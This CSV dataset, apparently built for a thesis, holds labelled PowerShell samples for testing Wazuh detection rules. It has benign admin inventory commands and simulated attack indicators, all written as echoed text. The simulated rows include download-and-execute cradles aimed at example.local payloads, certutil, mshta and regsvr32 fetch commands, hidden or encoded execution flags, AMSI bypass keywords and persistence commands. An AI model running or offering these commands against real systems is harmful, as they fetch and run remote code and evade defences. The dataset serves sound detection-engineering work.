id,label,class_id,source_family,source_reference_url,tactic,technique,scenario,obfuscation_type,execution_behavior,safety_class,scriptblock,expected_signal,safety_notes
BEN-065,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_localuser_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-065'; $scenario = 'admin_localuser_inventory_v3'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name,Enabled; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-066,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_localgroup_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-066'; $scenario = 'admin_localgroup_inventory_v3'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-067,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_firewall_profile_read,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-067'; $scenario = 'admin_firewall_profile_read_v3'; Get-NetFirewallProfile | Select-Object Name,Enabled; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-068,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_module_list,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-068'; $scenario = 'admin_module_list_v3'; Get-Module -ListAvailable | Select-Object -First 5 Name,Version; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-069,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_command_lookup,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-069'; $scenario = 'admin_command_lookup_v3'; Get-Command Get-Process | Select-Object Name,CommandType; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-070,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_json_formatting,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-070'; $scenario = 'admin_json_formatting_v3'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-071,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_csv_formatting,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-071'; $scenario = 'admin_csv_formatting_v3'; Get-Process | Select-Object -First 3 Name,Id | ConvertTo-Csv -NoTypeInformation; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-072,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_string_measure,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-072'; $scenario = 'admin_string_measure_v3'; 'routine maintenance script' | Measure-Object -Character; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-073,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_hash_string,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-073'; $scenario = 'admin_hash_string_v3'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-074,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_encoded_config_decode,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-074'; $scenario = 'benign_encoded_config_decode_v3'; $b='YgBlAG4AaQBnAG4AIABjAG8AbgBmAGkAZwA='; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-075,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_web_uri_string_only,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-075'; $scenario = 'benign_web_uri_string_only_v3'; $uri='https://intranet.example.local/status'; Write-Output $uri; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-076,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_long_admin_string,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-076'; $scenario = 'benign_long_admin_string_v3'; $note='administrative inventory ' * 20; Write-Output $note; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-077,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_special_chars_config,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-077'; $scenario = 'benign_special_chars_config_v3'; $cfg='path=C:\Temp;mode=audit;owner=admin;enabled=true'; Write-Output $cfg; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-078,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_concat_report_name,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-078'; $scenario = 'benign_concat_report_name_v3'; $name=('weekly' + '-' + 'inventory' + '-' + 'report'); Write-Output $name; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-079,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_process_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-079'; $scenario = 'admin_process_inventory_v4'; Get-Process | Select-Object -First 5 Name,Id,CPU; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-080,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_service_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-080'; $scenario = 'admin_service_inventory_v4'; Get-Service | Select-Object -First 8 Name,Status; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-081,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_os_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-081'; $scenario = 'admin_os_inventory_v4'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-082,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_bios_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-082'; $scenario = 'admin_bios_inventory_v4'; Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SerialNumber; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-083,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_disk_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-083'; $scenario = 'admin_disk_inventory_v4'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID,FreeSpace,Size; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-084,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_network_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-084'; $scenario = 'admin_network_inventory_v4'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias,IPv4Address; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-085,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_adapter_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-085'; $scenario = 'admin_adapter_inventory_v4'; Get-NetAdapter | Select-Object -First 5 Name,Status,MacAddress; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-086,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_eventlog_check,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-086'; $scenario = 'admin_eventlog_check_v4'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id,ProviderName; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-087,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_temp_listing,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-087'; $scenario = 'admin_temp_listing_v4'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-088,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_path_check,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-088'; $scenario = 'admin_path_check_v4'; Test-Path -Path $env:TEMP; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-089,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_date_check,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-089'; $scenario = 'admin_date_check_v4'; Get-Date | Select-Object DateTime; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-090,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_env_summary,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-090'; $scenario = 'admin_env_summary_v4'; Get-ChildItem Env: | Select-Object -First 6 Name,Value; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-091,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_localuser_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-091'; $scenario = 'admin_localuser_inventory_v4'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name,Enabled; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-092,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_localgroup_inventory,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-092'; $scenario = 'admin_localgroup_inventory_v4'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-093,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_firewall_profile_read,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-093'; $scenario = 'admin_firewall_profile_read_v4'; Get-NetFirewallProfile | Select-Object Name,Enabled; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-094,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_module_list,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-094'; $scenario = 'admin_module_list_v4'; Get-Module -ListAvailable | Select-Object -First 5 Name,Version; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-095,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_command_lookup,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-095'; $scenario = 'admin_command_lookup_v4'; Get-Command Get-Process | Select-Object Name,CommandType; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-096,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_json_formatting,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-096'; $scenario = 'admin_json_formatting_v4'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-097,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_csv_formatting,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-097'; $scenario = 'admin_csv_formatting_v4'; Get-Process | Select-Object -First 3 Name,Id | ConvertTo-Csv -NoTypeInformation; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-098,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_string_measure,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-098'; $scenario = 'admin_string_measure_v4'; 'routine maintenance script' | Measure-Object -Character; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-099,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,admin_hash_string,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-099'; $scenario = 'admin_hash_string_v4'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
BEN-100,benign,0,Local benign admin,local thesis-generated benign administration samples,Benign Administration,Benign PowerShell,benign_encoded_config_decode,none,execute_safe,benign_safe_execution,"$sampleId = 'BEN-100'; $scenario = 'benign_encoded_config_decode_v4'; $b='YgBlAG4AaQBnAG4AIABjAG8AbgBmAGkAZwA='; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $scenario)",should_not_alert_unless_rule_is_broad,Benign administrative or formatting command.
SIM-001,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Defense Evasion,T1059.001,encoded_command_flag,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-001'; $indicator = 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PLACEHOLDER>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-002,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Defense Evasion,T1059.001,execution_policy_bypass_flag,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-002'; $indicator = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File <placeholder.ps1>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-003,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Execution,T1059.001,downloadstring_cradle,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-003'; $indicator = 'Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://example.local/payload.ps1'')'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-004,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Execution,T1059.001,invoke_webrequest_cradle,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-004'; $indicator = 'IEX (Invoke-WebRequest -UseBasicParsing ''http://example.local/stage.ps1'').Content'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-005,simulated_malicious,1,Microsoft Sentinel detections,https://github.com/Azure/Azure-Sentinel/tree/master/Detections,Command and Control,T1059.001,webclient_object,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-005'; $indicator = 'New-Object System.Net.WebClient | ForEach-Object { $_.DownloadString(''http://example.local/stage'') }'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-006,simulated_malicious,1,Atomic Red Team T1059.001,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,Defense Evasion,T1059.001,frombase64_decode,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-006'; $indicator = '[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''<BASE64_PLACEHOLDER>''))'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-007,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Defense Evasion,T1059.001,hidden_window_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-007'; $indicator = 'Start-Process powershell.exe -WindowStyle Hidden -ArgumentList ''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-008,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Defense Evasion,T1059.001,nop_w_hidden_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-008'; $indicator = 'powershell -nop -w hidden -c ''<placeholder command>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-009,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Defense Evasion,T1059.001,downgrade_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-009'; $indicator = 'powershell.exe -Version 2 -NoProfile -Command ''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-010,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Command and Control,T1105,bits_transfer_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-010'; $indicator = 'Start-BitsTransfer -Source ''http://example.local/file'' -Destination ''$env:TEMP\file'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-011,simulated_malicious,1,Microsoft Sentinel detections,https://github.com/Azure/Azure-Sentinel/tree/master/Detections,Defense Evasion,T1059.001,reflection_load_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-011'; $indicator = '[Reflection.Assembly]::Load(<BYTE_ARRAY_PLACEHOLDER>)'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-012,simulated_malicious,1,Atomic Red Team T1059.001,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,Execution,T1059.001,add_type_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-012'; $indicator = 'Add-Type -TypeDefinition ''<CSharp placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-013,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Lateral Movement,T1059.001,scriptblock_remote_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-013'; $indicator = 'Invoke-Command -ComputerName ''<host>'' -ScriptBlock { <placeholder> }'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-014,simulated_malicious,1,Wazuh PowerShell guidance,https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/,Lateral Movement,T1059.001,pssession_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-014'; $indicator = 'Enter-PSSession -ComputerName ''<host>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-015,simulated_malicious,1,SigmaHQ PowerShell rules,https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell,Persistence,T1053,scheduled_task_string,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-015'; $indicator = 'New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile <placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-016,simulated_malicious,1,Elastic detection rules,https://github.com/elastic/detection-rules/tree/main/rules/windows,Persistence,T1547,registry_run_string,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-016'; $indicator = 'Set-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'' -Name ''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-017,simulated_malicious,1,Microsoft Sentinel detections,https://github.com/Azure/Azure-Sentinel/tree/master/Detections,Defense Evasion,T1562,amsi_keyword_placeholder,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-017'; $indicator = 'AmsiUtils and amsiInitFailed placeholder string for detection testing only'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-018,simulated_malicious,1,Atomic Red Team T1059.001,https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md,Collection,T1560,compress_archive_collection,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-018'; $indicator = 'Compress-Archive -Path ''$env:USERPROFILE\Documents\*.txt'' -DestinationPath ''$env:TEMP\archive.zip'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-019,simulated_malicious,1,MITRE ATT&CK T1059.001,https://attack.mitre.org/techniques/T1059/001/,Execution,T1047,process_create_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-019'; $indicator = 'wmic process call create ''powershell -NoProfile -WindowStyle Hidden <placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-020,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Command and Control,LOLBAS,certutil_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-020'; $indicator = 'certutil.exe -urlcache -split -f http://example.local/file.txt file.txt'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-021,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Execution,LOLBAS,mshta_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-021'; $indicator = 'mshta.exe http://example.local/test.hta'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-022,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Execution,LOLBAS,regsvr32_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-022'; $indicator = 'regsvr32.exe /s /n /u /i:http://example.local/scrobj.sct scrobj.dll'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-023,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Execution,LOLBAS,rundll32_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-023'; $indicator = 'rundll32.exe javascript:''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
SIM-024,simulated_malicious,1,LOLBAS,https://lolbas-project.github.io/,Defense Evasion,LOLBAS,installutil_lolbin_marker,none,emit_indicator_string_only,inert_string_telemetry,"$sampleId = 'SIM-024'; $indicator = 'InstallUtil.exe <placeholder assembly path>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",rule_or_scriptblock_keyword_match_possible,Indicator is emitted as text only; no external connection or harmful action is performed.
